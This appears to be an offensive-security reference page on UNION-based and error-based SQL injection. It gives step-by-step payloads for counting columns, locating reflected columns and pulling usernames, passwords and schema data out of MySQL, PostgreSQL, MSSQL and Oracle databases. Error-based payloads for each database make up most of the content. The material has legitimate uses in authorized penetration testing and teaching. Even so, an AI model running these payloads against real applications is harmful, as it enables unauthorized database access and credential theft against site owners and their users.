# UNION-Based & Error-Based Extraction

## Step 1: find the column count (required before UNION works at all)

Two methods — try `ORDER BY` first since it usually errors more cleanly:

```
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
...increment until you get an error (column count exceeded) or a
   visibly different/broken result; the last value that worked
   cleanly is your column count.
```

```
UNION SELECT NULL--
UNION SELECT NULL,NULL--
UNION SELECT NULL,NULL,NULL--
...increment until the UNION is accepted with no error. NULL is used
   for each position because it's valid for (almost) any column type,
   avoiding type-mismatch errors that would otherwise mask the real
   column-count signal.
```

**Do not skip this step and guess.** A UNION payload with the wrong column count will either error outright or return content from the wrong column position, which is what produces "I tried UNION extraction and got garbage" — the fix is almost always an uncounted column, not a deeper problem with the technique.

## Step 2: find which column(s) reflect into the visible response

Once the column count is confirmed, replace each `NULL` one at a time with a recognizable string to see which position(s) actually render somewhere in the page/response:

```
UNION SELECT 'canary1',NULL,NULL--
UNION SELECT NULL,'canary2',NULL--
UNION SELECT NULL,NULL,'canary3'--
```
Whichever position(s) show `canary` text in the response are your usable output channels — extract real data through those positions.

## Step 3: extract real data

```
UNION SELECT username,password,NULL FROM users--
UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
UNION SELECT column_name,NULL,NULL FROM information_schema.columns
  WHERE table_name='users'--
```
Concatenate multiple values into a single reflected column when you only have one usable output position:
```
MySQL/PostgreSQL: UNION SELECT CONCAT(username,':',password),NULL FROM users--
MSSQL:            UNION SELECT username + ':' + password,NULL FROM users--
Oracle:            UNION SELECT username||':'||password,NULL FROM users--
```

## Error-based extraction (when no UNION-reflected column exists, but errors are visible)

Deliberately trigger a SQL error that embeds query results inside the error message text itself, useful when the application shows verbose database errors but doesn't render UNION'd rows anywhere.

```
MySQL (classic double-query-based error, via duplicate-key collision):
  AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))
       x FROM information_schema.tables GROUP BY x)y)--
  -- forces an error whose message contains the version() output

MySQL (XPath-based, simpler to read):
  AND extractvalue(1,concat(0x7e,(SELECT version())))--
  AND extractvalue(1,concat(0x7e,(SELECT table_name FROM
       information_schema.tables LIMIT 1)))--

PostgreSQL:
  AND CAST((SELECT version()) AS int)--
  -- forces a type-cast error whose message includes the string that
     failed to cast, i.e. your extracted data

MSSQL:
  AND 1=CONVERT(int,(SELECT @@version))--
  -- same idea: forces a conversion error that echoes the value

Oracle:
  AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE
       rownum=1))--
```
Error-based extraction is typically limited to one value per request (whatever fits in the error message), but each request is a complete extraction rather than a single true/false bit — much faster than boolean-blind when verbose errors are available at all.

## Confirming, not just attempting

A UNION/error-based finding needs **actual recognizable data** in the response — a real version string, a real username, a real table name — not just "the query was accepted without erroring." If your column-count probe succeeds but subsequent data extraction returns nothing recognizable, recheck the reflected-column mapping (step 2) before concluding extraction isn't possible.
